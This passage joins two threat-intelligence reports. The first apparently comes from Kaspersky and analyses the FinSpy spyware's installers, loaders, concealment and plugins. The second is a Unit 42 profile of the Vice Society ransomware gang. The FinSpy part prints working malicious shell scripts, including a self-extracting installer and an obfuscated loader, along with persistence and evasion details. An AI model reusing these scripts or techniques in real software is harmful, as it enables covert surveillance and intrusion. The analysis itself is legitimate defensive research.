When the Post-Validator receives the Trojan Installer (which is a DLL), it: Reflectively loads and launches the Installer 
Depending on the configuration, either uninstalls itself (by deleting its directory and the scheduled task) or goes to sleep until system reboot. 
Based on the data collected by the Post-Validator, it is most likely that: The Post-Validator is deployed to ensure that the infected victim is the intended one. 
The C2 server operator manually analyzes data received from the victim and commands to either remove the Post-Validator or infect the machine with the Trojan. 
The Post-Validator is another obstacle for researchers.
Even if they manage to pass all the checks of the Pre-Validator, the C2 server operator may refuse to infect a suspicious machine. 
The Trojan Installer The Installer creates the working directory (path: %localappdata%\Microsoft\<two concatenated English words>) and sets it as being accessed, modified and created a year earlier.
Afterwards, it drops the following files to it: File name Description <4 random hexadecimal characters>.cab The setup configuration file, which is encrypted with RC4 (key: the name of the working directory). 
Names differ between samples The encrypted VFS file. 
The Initial Loader. 
msvcr90.dll The Trojan bundle, encrypted with XOR and compressed with aPLib. msvcr120d.dll 64-bit Trojan loader.
The executable is prepended with 0x4000 random bytes and encrypted with RC4 (key: machine GUID) msvcr140d.dll 32-bit Trojan loader, also prepended with random bytes and encrypted with RC4. 
The timestamps of dropped files are set to one year earlier than the current date.
Once the working directory is prepared, the Installer launches the Trojan. 
The Initial Loader The Initial Loader is a DLL that is launched on every startup by rundll32.exe (the Trojan adds it to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key, the value name is unique for each sample).
The size of the Initial Loader exceeds 5 MB.
It is obfuscated with a protector resembling the open source OLLVM obfuscator.
Despite its size, the only functionality of the Initial Loader is to decrypt and launch the 32-bit Trojan Loader. 
The Trojan Loader The 32-bit Trojan Loader, which is launched regardless of the victim machine architecture, checks if it is running on a 64-bit system.
If so, it reads the 64-bit loader (msvcr120d.dll) from disk and runs it as a shellcode. 
The Trojan Loader (either the 32-bit or the 64-bit one): Reads the Trojan bundle file (dll), decrypts it with XOR and unpacks with aPLib. 
Injects the Trojan DLL into exe by either calling CreateRemoteThread or using the KernelCallbackTable technique. 
MacOS Infection The macOS version of the malware is not as complicated as the Windows one.
It is written in Objective-C. An obfuscator similar to OLLVM is used to protect FinSpy for Mac.
Additionally, Objective-C selectors that may reveal information about method names contain junk. 
The macOS version of FinSpy has the following components: The Installer.
Unlike the Windows version that features numerous installers, the macOS version has only one installer type. 
The Initial Loader. 
The Trojan Loader. 
The Trojan that consists of the Orchestrator, the Cryptography Library and plugins. 
The Installer When the victim executes the malicious app, an executable located at the <malicious application name>.app/Contents/MacOS/installer path is launched.
On startup, it checks the environment for debuggers and virtual machines.
It drops the following files to the machine: Path Description /Library/Frameworks/Storage.framework A directory with the Trojan inside /private/etc/logind The Trojan loader that runs as a launch agent.
This file is executed on startup. 
/Library/LaunchAgents/logind.plist The configuration of the logind agent.
The Trojan needs it in order to maintain persistence. 
All copied files are timestomped (modification date is the timestamp of Finder.app).
The Installer sets their owner to root:wheel.
It additionally sets the SUID and SGID bits of the /private/etc/logind file. 
By copying the logind.plist file to the /Library/LaunchAgents directory the Installer configures the Trojan to load at startup. 
The Installer then launches the logind executable (Trojan Loader) with the launchctl utility. 
The Initial Loader The Initial Loader (/private/etc/logind) launches every time when the operating system boots up.
Once launched, The Initial Loader launches the Trojan Loader (/Library/Frameworks/Storage.framework/Contents/MacOS/logind). 
The Trojan Loader The Trojan Loader has a constructor function that is invoked before main.
It sets hooks on functions that load application bundles.
These hooks allow the Trojan to load plugins while decrypting them on the fly. 
Once the hooks are placed, the Trojan Loader launches the Orchestrator (/Library/Frameworks/Storage.framework/Contents/Resources/dataPkg).
The Orchestrator (as well as plugins) are packed with aPLib and encrypted with AES.
When the Orchestrator is unpacked, it is reflectively loaded. 
Linux Infection The Linux version of FinSpy is protected with an obfuscator similar to OLLVM.
It has the same components as in the macOS version (Initial Loader, Trojan Loader, Orchestrator and plugins). 
The Installer Infection vectors used to deliver FinSpy for Linux are unknown.
The leaked FinFisher support questions database suggests physical access could be used to infect machines: 
A question related to Linux infection which was submitted to FinFisher support in 2013 
The initial stage of the Installer is the following shell script:#!/bin/sh ELF_MAGIC=7f arch=`od -j4
-N1 -An
-t u1 < /bin/sh | tr -d ' '` case $arch in 1) 
ARCHIVE=`grep --text --line-number '^__x86xx__$' "$0" | cut -d ':'
-f 1` ;; 2) 
ARCHIVE=`grep --text --line-number '^__x64xx__$' "$0" | cut -d ':'
-f 1` ;; *) exit 0 ;; esac ARCHIVE=$((ARCHIVE+1)) tail -n +$ARCHIVE $0 > /tmp/udev2 && chmod +x /tmp/udev2 if [ -n "$SUDO_USER" ]; then su -c /tmp/udev2 $SUDO_USER else /tmp/udev2 fi if [ "$?"
-eq 0 ];then rm -rf "$0" fi exit 0 
This script determines the victim machine architecture.
Depending on it, the script extracts either the 32-bit or the 64-bit second stage installer to the /tmp/udev2 file and launches it.
Both versions of the installer executable are appended to the Bash script.
The 32-bit version is delimited from the script with the __x86xx__ string, and the __x64xx__ string delimits the 64-bit version from the 32-bit one. 
The launched executable first checks if it is running in a virtual machine with: The CPUID assembly instruction The lspci command The dmesg command 
In case a virtual machine is detected and the installed Trojan cannot be launched in a VM, the installer exits.
The working directory is located at the ~/<directory #1>/<directory #2> path. 
Directory #1 and #2 can take the following names that are selected randomly: Directory #1 names Directory #2 names .cache .dbus .fontconfig .gconf .gnome .gnome2 .kde .local .qt .ssh .config .bin .sbin .etc .cfg .apps 
The installer then drops the Trojan to the working directory.
The name of the Trojan Loader file is one of the following: cpuset kthreadd ksnapd udevd dbus-daemon atd crond hald 
The plugin files have the <module ID>.so name, and the names of their configurations are <module ID>C.dat. 
After dropping the files, the Installer sets up persistence.
On KDE, it copies a Bash script to either ~/.kde4/Autostart/udev2.sh or ~/.kde/Autostart/udev2.sh.
On other desktop environments , it appends the same script to the ~/.profile file. 
The Initial Loader The Initial Loader is the following shell script:
if [ ! -n
"$CS_FONT" ]; then # Load fonts by id CS_FONT_RID="<hexadecimal-encoded working directory path>" CS_FONT_ID="<hexadecimal-encoded Trojan Loader filename>" CS_FONT_COL="6364" CS_FONT_COLF=`echo ${CS_FONT_COL} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` CS_FONT_SID=`echo ${CS_FONT_RID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` CS_FONT_LOAD=`echo ${CS_FONT_ID} |sed 's/../& /g' |sed 's/ / p /g' |awk '{print "16i "$0}'|dc 2>/dev/null|awk '{printf("%c",$0)}'` if [ ! -n
"$CS_FONT_COLF" ]; then CS_FONT_COLF=$(for i in `echo ${CS_FONT_COL} |sed 's/../& /g'`; do echo "000000 $i" | xxd -r; done) 
CS_FONT_SID=$(for i in `echo ${CS_FONT_RID} |sed 's/../& /g'`; do echo "000000 $i" | xxd -r; done) 
CS_FONT_LOAD=$(for i in `echo ${CS_FONT_ID} |sed 's/../& /g'`; do echo "000000 $i" | xxd -r; done) fi ${CS_FONT_COLF} ${CS_FONT_SID} && ${CS_FONT_LOAD} > /dev/null 2>&1 && ${CS_FONT_COLF} - > /dev/null 2>&1 unset CS_FONT_ID unset CS_FONT_COLF unset CS_FONT_SID unset CS_FONT_LOAD fi This script decodes the directory path and the Trojan Loader from hexadecimal and executes the “cd <working directory path> && ./<loader
filename> > /dev/null 2>&1 && cd – > /dev/null 2>&1″ command, thus launching the Trojan Loader. 
The Trojan Loader When launched, the Trojan Loader: Checks if it is being debugged with the ptrace function and exits if it is. 
Reads the Orchestrator file from disk and unpacks it with aPLib. 
Reflectively loads and launches the Orchestrator. 
The Trojan Overview of the Windows Trojan components The Windows version of the Trojan consists of the following components: The Hider, the first launched component.
It starts the Orchestrator and conceals memory areas that contain the Trojan components’ code and data. 
The Orchestrator, a DLL which is responsible for managing installed plugins and preparing data to be sent to the C2 server Plugins, DLL modules that perform malicious activities on the victim machine The virtual file system (VFS) which allows the Orchestrator and other plugins to seamlessly interact with plugins and their configurations The ProcessWorm module which intercepts system activity.
Similar to a network worm which infects machines in the local network, the ProcessWorm is injected into all running processes.
Once a process is infected, the ProcessWorm spreads to its children. 
The Communicator module which sends data to the C2 server and receives replies The Hider The Hider is the first launched component of the Backdoor.
It is a valid PE file protected with the FinSpy VM.
On startup, the Hider loads a clean copy of ntdll.dll from disk, which is used when calling API functions from this library. 
After that, it decrypts the Orchestrator, which is stored in the Hider’s resource section.
It is encrypted with a 256-byte RC4 key.
which is unscrambled at runtime using addition, subtraction and XOR operations.
The key may vary from one sample to another. 
A snippet of the RC4 key generation function After decrypting and unpacking the Orchestrator, the Hider reflectively loads it. 
The hiding functionality Before transferring execution to the Orchestrator’s entry point, the Hider activates its concealing functionality.
It works as follows: The Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them When the Orchestrator accesses hidden pages, the operating system generates an ACCESS_VIOLATION exception The Hider detects the generated exception through the hook of the KiUserExceptionDispatcher function, which handles dispatching of all exceptions The hooked function decrypts the hidden page and assigns it the PAGE_EXECUTE_READWRITE attribute, thus handling the exception The Hider conceals the unhidden pages again within 30 seconds. 
The Hider also protects plugins loaded by the Orchestrator. 
The Orchestrator The Orchestrator is the core module of the Trojan that controls all plugins and manages C2 server communications. 
When the Orchestrator starts up, it: Hooks its own IAT (import address table) to alter the behavior of WinAPI file manipulation functions.
The Orchestrator needs these hooks to interact with the VFS. 
Sets up persistence by creating an entry in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key. 
Reads the Orchestrator configuration and loads installed plugins. 
An interesting fact about the Orchestrator is that it erases its PE structures and code of initialization procedures.
This trick is designed to make it more difficult to detect this component in memory and conduct analysis of its dumps. 
Once initialized, the Orchestrator launches its following components, which we will detail below: The application watcher that looks for specific processes and notifies the C2 server when they are started or stopped The ProcessWorm injector that injects the ProcessWorm into processes that are not infected with this component The recording manager thread that controls data to be exfiltrated to the C2 server The C2 server communicator thread. 
The application watcher The application watcher regularly examines all the processes on the system, looking for applications specified in the Orchestrator configuration.
When it detects a starting first (or a stopping last) instance of a process from the list in the configuration, an appropriate event will be reported to the C2 server during heartbeat time.
It is notable that the application watcher acquires handles for all running processes on the system, which results in either winlogon.exe or explorer.exe obtaining numerous process handles. 
Process handles acquired by explorer.exe on a clean system (left) and on an infected system with the Orchestrator residing inside the explorer.exe process (right) 
The ProcessWorm injector The ProcessWorm injector thread ensures that the ProcessWorm is running in every process which can be accessed by the Orchestrator.
Just like the application watcher, the injector regularly obtains the list of running processes.
For every process, it verifies whether the ProcessWorm is running inside it and injects the ProcessWorm if needed. 
The recording manager Over the course of their execution, plugins may save recording files in the working directory (e.g. keylogs, screenshots or printed files).
The recording manager is tasked with two duties: Periodically checking whether there are recording files available to be sent to the C2 server Preparing recording files to be uploaded when their download is requested by the C2 server. 
Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.
The Orchestrator has arrays which converts IDs to prefixes and extensions. 
Possible plugin prefixes: auth, avi, cert, crt, com, mem, sxs, msvc, dmem, mtx, net, nls, odbc, ole, pnp, ssl, win, vm, vsc, ntos, user, run, cvs, cvg, con, ssy Recording type prefixes: inf, sys, doc, mem, vmx, net, run, dat, dll. 
Filename extensions used: doc, vmx, net, xls, zip. 
The C2 server communication thread This thread is responsible for maintaining communication with the C2 server.
In particular, it contacts the C2 server, sends heartbeats messages and receives commands.
The thread dispatches received commands to plugins and sends their execution results back to the server. 
Below is a list of the Orchestrator commands: Command ID Description Commands related to recordings 0x8072A0 Upload a recording file with a specified name to the C2 server. 
0x8076A0, 0x807AA0 Delete a recording with a given filename from the system. 
0x8078A0 Retrieve the list of all the recordings present on the victim machine. 
0x8070A0 Retrieve the list of recordings made by a plugin with the specified ID. 
Commands related to the configuration 0x8030A0 Send the current configuration to the server. 
0x8032A0 Change the Orchestrator configuration. 
Commands related to plugins 0x8009A0 Send a list of installed plugins to the server. 0x8054A0, 0x805BA0 
Commence the plugin installation process by creating a temporary file in the working directory. 
0x8056A0, 0x805DA0 Append a plugin body chunk to the temporary plugin file created by the previous command. 0x8057A0, 0x805EA0 Finalize the plugin installation process.
This command moves the contents of the temporary file to the virtual file system and loads the new plugin. 
0x8059A0 Uninstall a plugin from the machine.
This command unloads the specified plugin and removes it from the VFS. 
Miscellaneous commands 0x8018A0 
Uninstall the backdoor.
This command wipes all the files and registry keys created by the backdoor, as well as restores the MBR and the EFI Windows Boot Manager (provided they were infected) from backups. 
0x807DA0 Close the current C2 server connection. 
0x7502A0 Terminate all livestreams. 
The Communicator module The malware configuration includes one or multiple C2 servers which it can connect to.
In case one of the servers is down, the backdoor uses one of the fallback addresses.
FinSpy does not communicate with C2 servers directly from winlogon.exe or explorer.exe.
Instead, it spawns a default browser process with a hidden window and injects the Communicator module in it.
This is done to make communications look legitimate. 
The Virtual File System component The Virtual File System is the place where all the plugin executables and their configurations hide.
All the virtual files are stored in a single “real” file, which is encrypted with RC4 and has the following structure: File offset Description 0x0 CRC32 checksum of the file (the checksum computation starts from offset 4) VFS entry #1 0x4 ID of the plugin corresponding to the file.
The Orchestrator configuration is stored on the VFS with ID 0xFFFFFFFE. 
0x8 0x0 if the file is a plugin configuration, 0x2 if it is a plugin executable. 
0xC File size. 
0x10 File size again. 
0x14 File body bytes. 
VFS entry #2 … The last VFS entry has the ID equal to 0xFFFFFFFF and zero size.
It serves as the VFS end marker. 
EndOfFile – 0x10 0xFFFFFFFF EndOfFile – 0xC 0x0 EndOfFile – 0x8 0x0 EndOfFile – 0x4 0x0 
The VFS is accessed via file management functions hooked by the Orchestrator.
For example, virtual files can be created or opened via the hooked CreateFileW API.
The return value of the hooked file creation function is a VFS handle, which is a number of the format 0xFF000XXX. 
The ProcessWorm 
The malware injects the ProcessWorm into all processes running on the system.
Its main purpose is to extract specific information about running processes and send it to the Orchestrator or the plugins. 
The ProcessWorm is a DLL wrapped in a shellcode and obfuscated with FinSpy VM.
The ProcessWorm can be injected to processes in two ways – either by spawning a remote thread with the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.
The latter one is used when the ProcessWorm is injected into newly created processes. 
The loader code behaves differently depending on the chosen injection type.
While the loader used with the first injection method is simple, the one invoked in case of APC injections is rather interesting.
The asynchronous procedure places a hook on the NtTestAlert function and then exits.
When the process executable is loaded, ntdll.dll will call the NtTestAlert function.
Its modified version will first call the original NtTestAlert function and then invoke the ProcessWorm reflective loader. 
The ProcessWorm reflective loader comes with a twist.
When it processes imports, it does not assign a function pointer to each entry in the IAT.
Instead, IAT entries point to buffers of randomly generated junk code.
This code obtains the address of the destination API function by XOR-ing two numbers and then jumps to it. 
Example of junk code created by the ProcessWorm loader, useful instructions are highlighted in yellow While executing its worm-like activity, the ProcessWorm injects itself into processes created by the process that are already infected with this component.
To do that, it places a hook on the CreateProcessInternalW API function.
If the new process is not created with a DEBUG_PROCESS or a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible hook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new process.
When the new process starts up, the ProcessWorm will be loaded with the help of the APC injection loader. 
Depending on the malware configuration, the ProcessWorm may hide the presence of FinSpy on the victim machine.
It can conceal the malware’s working directory, services, registry keys, C2 server addresses, as well as filter out event logs related to the malicious activity.
The ProcessWorm achieves stealth by hooking low-level API functions (such as NtEnumerateValueKey or NtQuerySystemInformation) 
The rest of the malicious activity is dispersed across hooks of various WinAPI functions.
They are placed in order to provide information to the plugins bundled with the malware.
Examples of such information are typed keystrokes or documents sent to the printer. 
The macOS and Linux Orchestrator The macOS/Linux orchestrator is a simplified version of the Windows orchestrator.
Unlike the Windows version, it does have the following components: The Virtual File System (plugins and configurations are stored in separate files) 
The ProcessWorm (its functionality is embedded into plugins) 
The communicator module (the Orchestrator exchanges data with C2 servers without additional modules) 
The application watcher (the Orchestrator does not report started or stopped processes to C2 servers) The functionalities of the Orchestrator remain the same: exchanging information with the C2 server, dispatching commands to plugins and managing recording files. 
Plugins overview In the chart below we summarize information about plugins. 
Plugin type and ID Features FileManager (0x02) Upload, download, search, delete files.
Create file listing recordings CommandShell (0x04) Create remote shell sessions TaskScheduler (0x05) Create different types of recordings (file listings, microphone, screen, webcam) at a specified time by dispatching commands to appropriate plugins MicRecorder (0x10) Livestream the victim’s microphone or capture its recordings. 
KeyLogger (0x12) Livestream or record keystrokes SkypeStealer (0x14) 
Intercept Skype contacts, chats, calls and transferred files FileModificationRecorder (0x16) Record files which have been modified FileAccessRecorder (0x17) Record files which have been accessed PrintedFilesRecorder (0x18) Steal files which are printed by the victim FileDeletionRecorder (0x19) Record removed files ForensicLauncher (0x20) Gather forensic data by downloading and executing specific utilities.
(Windows only) VoIPRecorder, VoIPLite (0x21, 0x26) Eavesdrop on, and take screenshots during, online conversations.
(Windows only) ClickRecorder (0x22) Capture the screen area around mouse click locations WebcamRecorder (0x23) Take webcam images with a specified frame rate, and livestream or record them. 
ScreenRecorder (0x24) Take screenshots with a specified frame rate, and livestream or record them. 
BlackberryInfect (0x25) Infect Blackberry mobile devices with a malicious application.
(Windows only) EmailRecorder (0x27) Steal email from Thunderbird, Outlook, Apple Mail and Icedove WiFiRecorder (0x28) 
Monitor available Wi-Fi networks RemovableRecorder (0x29) Record files on inserted removable media CryptoKeyRecorder (0x30) Capture encryption keys: SSL keys, S/MIME certificates, GPG/PGP keychains along with their passphrases.
(Windows only) 
IoCs The following IoC list is not complete.
If you want more information about the APT discussed here, a full IoC list and YARA rules are available to customers of Kaspersky Threat Intelligence Reports.
Contact: intelreports@kaspersky.com File Hashes 5EDF9810355DE986EAD251B297856F38 31F1D208EE740E1FDF9667B2E525F3D7 4994952020DA28BB0AA023D236A6BF3B 262C9241B5F50293CB972C0E93D5D5FC 405BB24ADE435693B11AF1D81E2BB279 EF74C95B1DBDBF9BD231DA1EE99F0A7E B8A15A0CE29692FBA36A87FCDED971DE File Paths \efi\microsoft\boot\en-us\%HEXNUMS% – on EFI disk partition /Library/Frameworks/Storage.framework – for Mac OS version Mutexes SessionImmersiveMutex WininetStartupMutex0 Events 0x0A7F1FFAB12BB2 WinlogonLogon Debug.Trace.
Event.f120.0.v1 TermSrvReadyEvent%HEXNUMS% SessionImmersiveEvent Filemappings 0x0A7F1FFAB12BB3 windows_shell_global Mailslots mailslot\x86_microsoft.windows.c-controls.resources_6595b64144ccf1df_6.0.7600.16385_en-us_581cd2bf5825dde9 mailslot\x86_microsoft.vc90.mfc_1fc8b3b9a1e18e3b_9.0.30729.6161_none_4bf7e3e2bf9ada4c mailslot\6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2 mailslot\ConsoleEvent-0x00000DAC–16628266191048322066-650920812-1622683116-1844332734-1046489716-2050906124-443455187 Domains and IPs 45.86.136[.]138 79.143.87[.]216 185.25.51[.]104 109.235.67[.]175 213.252.247[.]105 108.61.190[.]183 185.141.24[.]204 1 Extended BIOS Data Area (https://wiki.osdev.org/Memory_Map_(x86)) 
title: Vice Society:
Profiling a Persistent Threat to the Education Sector url: https://unit42.paloaltonetworks.com/vice-society-targets-education-sector/ Executive Summary Vice Society is a ransomware gang that has been involved in high-profile activity against schools this year.
Unlike many other ransomware groups such as LockBit that follow a typical ransomware-as-a-service (RaaS) model, Vice Society’s operations are different in that they’ve been known for using forks of pre-existing ransomware families in their attack chain that are sold on DarkWeb marketplaces.
These include the HelloKitty (aka FiveHands) and Zeppelin strains of ransomware as opposed to Vice Society developing their own custom payload. 
In September 2022, a joint Cybersecurity Advisory (CSA) from the FBI, CISA and the MS-ISAC declared they had recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
The CSA continued that attacks could increase as the 2022-23 school year begins and criminal ransomware groups perceive opportunities for successful attacks. 
Vice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting the CVE-2021-34527 (aka PrintNightmare) vulnerability as part of their attack chain.
The gang is also known to target backups and exfiltrate data from compromised systems to be leveraged for the purpose of double extortion, a common ransomware operation tactic where victims are pressured to pay a specified ransom amount in exchange for decryption and to avoid having sensitive data published on the attacker’s dedicated leak site. 
Palo Alto Networks customers receive protections against ransomware used by Vice Society from Cortex XDR, as well as from the WildFire cloud-delivered security service for the Next-Generation Firewall.
The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk. 
Table of Contents Vice Society Activity TimelineStudy of Vice Society’s VictimsGeographical ImpactImpacted Industry VerticalsLeak Site Metric ComparisonsUnit 42 Incident Response Data on Vice SocietyVice Society Technical DetailsLeak Site SynopsisHelloKitty UsageZeppelin UsageConclusionTactics, Techniques and Procedures (TTPs)Indicators of Compromise (IoCs)Additional Resources Vice Society Activity Timeline Early reports of the extortion group Vice Society were shared on Twitter by malware researchers such as Michael Gillespie.
These tweets depicted HelloKitty ransomware payloads appending a .v-society extension to encrypted files on June 10, 2021. 
Since then, Vice Society has used a variety of different ransomware strains including the following notable examples: In June 2021, Vice Society infected victims with HelloKitty. 
In 2021 and 2022, Vice Society used Zeppelin to target Windows hosts. 
During their 2021 infections, these attackers also exploited vulnerabilities such as PrintNightmare to escalate privileges and spread laterally across targeted networks. 
Based on leak site activity we’ve observed in recent months, as shown in Figure 1, we saw a subtle spike at the turning point from 2021 to 2022.
This was followed by one large spike of activity at the end of spring 2022. 
Figure 1.
Vice Society activity timeline (all leak site victim data).Fast forward to fall 2022, when we saw another wave of Vice Society activity across the education sector, as shown in Figure 2, which prompted a flood of advisories and reports about the group. 
The noticeable spikes in spring and fall give us a hint at some of their motivations.
As education organizations are the group’s prime target, this could be an indication that they’re timing campaigns to coincide with this sector’s unique calendar year.
The school year for most educational institutions in the U.S. typically starts in late August-September and ends in June.
They might have been trying to time their attacks in 2022 with the transitions of the beginning and end of the school year. 
Figure 2.
Vice Society activity timeline (education-specific leak site victim data).Study of Vice Society’s Victims Vice Society is notorious for targeting the education sector – K-12 and higher education institutions in particular (as referenced in the recent CISA Advisory).
Other targeted sectors include healthcare and nongovernmental organizations (NGOs). 
Common targets are small- to medium-size businesses, with no geographical focus apparent at this time.
Rather, as noted in a report by SOCRadar, Vice Society focuses on targets of opportunity. 
For years, sectors such as education and healthcare have suffered from many challenges in combating ransomware that have made them particularly attractive targets.
A lack of budgeting for systems and security solutions has led many organizations to run legacy hardware that isn’t patched against the latest vulnerabilities. 
Other challenges that could increase the overall attack surface of these organizations include difficulties in controlling and managing a large number of personal devices brought in by students and staff members.
These personal devices introduce inherent risk because they may interact with personal files via cloud services. 
Although these sectors might have dedicated IT or security teams that run traditional security solutions such as an intrusion detection system (IDS) or intrusion prevention system (IPS), ransomware threat actors are leveraging living off the land techniques that can effectively circumvent traditional signature-based detection mechanisms.
These tactics require an extended detection and response (XDR) platform for more robust behavioral monitoring within a network. 
The education and healthcare sectors also experience the common challenge of finding staff who are adequately trained to handle the ongoing threat of ransomware.
And lastly, many of these organizations are charged with protecting some of the most sensitive and valuable personally identifiable information (PII) of any business sector. 
Geographical Impact Vice Society is primarily opportunistic, and its targets have included organizations across the globe.
The group has infected organizations based in all regions, as shown in Figures 3 and 4, with the largest numbers in the U.S., followed by the U.K., Spain, France, Brazil, Germany and Italy. Figure 3.
Global geographic distribution of organizations listed on Vice Society leak site.
Figure 4.
Chart version of global geographic distribution of organizations listed on Vice Society leak site.
The CISA advisory mentions how Vice Society has disproportionately targeted educational institutions in the United States.
Looking at leak site data in more detail, the group appears to be targeting more educational organizations based in California, as shown in Figure 5. 
Figure 5.
Vice Society United States victimology (all leak site victim data).Impacted Industry Verticals Although Vice Society has been in the headlines for targeting educational organizations, they also extort victims in many other industry verticals, as shown in Figure 6, including those supplying critical infrastructure, such as healthcare, government entities and manufacturing. 
Figure 6.
Industry verticals targeted by Vice Society (leak site data).Leak Site Metric Comparisons 
According to analysis of ransomware leak sites, Unit 42 has identified Vice Society as being in the top 10 of the most impactful ransomware gangs of 2022.
We estimate that, since it started operations in 2021, Vice Society has impacted more than 100 organizations in total.
More than 90 of the total published leak site infections occurred in the year 2022 alone. 
Leak site data suggests that Vice Society has had the highest impact on education organizations this year, with at least 33 educational institutions having been listed on the group’s dedicated ransomware leak site.
This impact is closely followed by ransomware families such as LockBit 2.0 and 3.0, as shown in Figure 7. Figure 7.
Top ransomware families targeting educational institutions in 2022 (leak site data).Unit
42 Incident Response Data on Vice Society Since Vice Society’s inception in 2021, Unit 42 has performed incident response (IR) engagements with clients who have been impacted by Vice Society.
Let’s look at some of the data from these incidents. 
Dwell Time 
In Unit 42 IR cases regarding Vice Society, we observed dwell times as high as six days.
This represents the time elapsed between the date of initial compromise and the date of initial discovery. 
Ransom Demands When tracking ransomware group operations, Unit 42 takes note of the initial and final ransom demands made by each ransomware group.
This allows us to better understand how aggressive a particular ransomware gang’s demands might be for particular industry verticals, and to get a general view into the rate at which a particular actor might drive their demands down after negotiations take place. 
Our observations of ransom demands by Vice Society across IR cases include: Initial demands by this actor could exceed $1 million. 
Final demands after negotiations were as high as $460,000. 
The difference between initial demands and final demands could be significant.
We saw decreases as large as 60%. 
Vice Society Technical Details Leak Site Synopsis Over the past year, Vice Society has operated sites on the Tor network using the following .onion address:vsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion On Oct. 20, the primary .onion address became inactive, while the following site mirror was still active: ssq4zimieeanazkzc5ld4v5hdibi2nzwzdibfh5n5w4pw5mcik76lzyd[.]onion Recently, the header for the group’s blog site bears a striking resemblance to the logo of a popular video game titled “Grand Theft Auto: Vice City” (shown in Figure 8). 
Figure 8.
Vice Society active leak site mirror (Oct. 20).On Oct. 25, the original .onion address became active again.
It was updated to include additional blog sections.
As of early November, the “Our Blog” page showcased one article that highlights the group's notoriety, as shown in Figure 9. Figure 9.
Vice Society leak site including additional blog content (early November).The new “Our Partners” page takes the place of the main page from the previous incarnation of the leak site, including links to view leaked victim data. 
The new “For Victims” page directs victims to the ransom note that is dropped as part of the group’s infection chain.
This is followed by additional instructions in case the victim doesn’t respond to one of the contact emails provided in their ransom note.
During the extortion process, the attacker typically gives victims seven days to fulfill ransom demands, as shown in Figure 10. Figure 10.
Vice Society leak site victims page.
The “For Journalists” page depicts a “Frequently Asked Questions” section to address general questions about the group, as shown in Figure 11. Figure 11.
Vice Society leak site journalists page.
HelloKitty Usage At the start of the group’s observed operations in 2021, Vice Society affiliates used the HelloKitty Ransomware variant as a primary payload in their infection chain. 
This ransomware family was first observed in December 2020, primarily targeting Windows systems.
This variant gets its name from its mutex: HELLOKITTYMutex. 
In July 2021, as described in our HelloKitty ATOM, Unit 42 came across a Linux (ELF) sample with the name funny_linux.elf that had a ransom note with contents similar to those of HelloKitty for Windows samples.
This Linux sample led to the discovery of additional HelloKitty samples for Linux dating back to October 2020.
In March 2021, HelloKitty’s Linux variant was also observed in the wild to target ESXi servers. 
Similar to ransomware variants like BlackCat, HelloKitty ransomware typically requires a key to execute, to hinder analysis efforts.
In HelloKitty’s case, this key is typically obfuscated with AES 256 encryption.
As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report. 
Figure 12.
Vice Society ransom note using HelloKitty ransomware.
When the encryption process is complete, encrypted files are typically appended with an extension using the following format: .v-society.<victim ID>. 
Zeppelin Usage As previously mentioned, the Vice Society group has also been known to adopt other ransomware families such as Zeppelin as a part of their infection chain.
Upon execution, the ransomware binary deletes itself and drops a ransom note on the victim machine’s desktop titled !!!
ALL YOUR FILES ARE ENCRYPTED !!!
.TXT.
The contact email address provided by the threat actor vary between samples, but the public v-society.official@onionmail[.]org address and the Tor .onion link remain consistent. 
Figure 13.
Vice Society ransom note using Zeppelin ransomware.
Additional execution details include the following: Creating the HKCU\Software\Zeppelin registry key Appending an extension with the format A1A-A80-4CD to encrypted files Creating a file called README.txt.v-society Imphash: 8acb34bed3caa60cae3f08f75d53f727 Creating a temp file with a .Zeppelin extension using the following format - C:\Users\<User>\AppData\Local\Temp\7D3ED7F1.Zeppelin Conclusion School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors.
The opportunistic targeting often seen with cybercriminals can put even school districts with robust cybersecurity programs at risk.
K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers. 
Vice Society and its consistent targeting of the education industry vertical, particularly around the September time frame, serves as a warning that this group has shaped their campaigns to take advantage of the school year in the U.S.
It’s likely they’ll maintain use of these tactics to impact the cyberthreat landscape moving forward, as long as their activities continue to be lucrative for them. 
Educational institutions should continue to implement security best practices and be wary of the ongoing threat of ransomware, especially during the start and end of the school year. 
K-12 institutions and universities do have an advantage when it comes to protecting themselves that too few organizations use to its full potential.
In a school environment, there are many educators who can help inform trainings for both staff and students to learn what they need to do to maintain security for everyone in the organization. 
Vice Society’s use of multiple ransomware payloads across both Windows and Linux hosts shows that they’re continually evolving.
They will likely continue leveraging additional ransomware strains in the future, as well as exploiting newly disclosed vulnerabilities. 
As we do with other ransomware groups, Unit 42 strongly advises organizations that have been impacted by Vice Society to avoid paying a ransom if possible, and to instead consult a trusted IR negotiation team for the best course of action. 
Palo Alto Networks customers receive protections against ransomware used by Vice Society from Cortex XDR, as well as from the WildFire cloud-delivered security service for the Next-Generation Firewall. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: North America Toll-Free: 866.486.4842 (866.4.UNIT42) EMEA: +31.20.299.3130 APAC:
+65.6983.8730 Japan: +81.50.1790.0200 Tactics, Techniques and Procedures (TTPs) 
Unit 42 has observed the following TTPs being used by Vice Society in past incident response engagements involving the group.
The following table illustrates these TTPs according to the MITRE ATT&CK framework. 
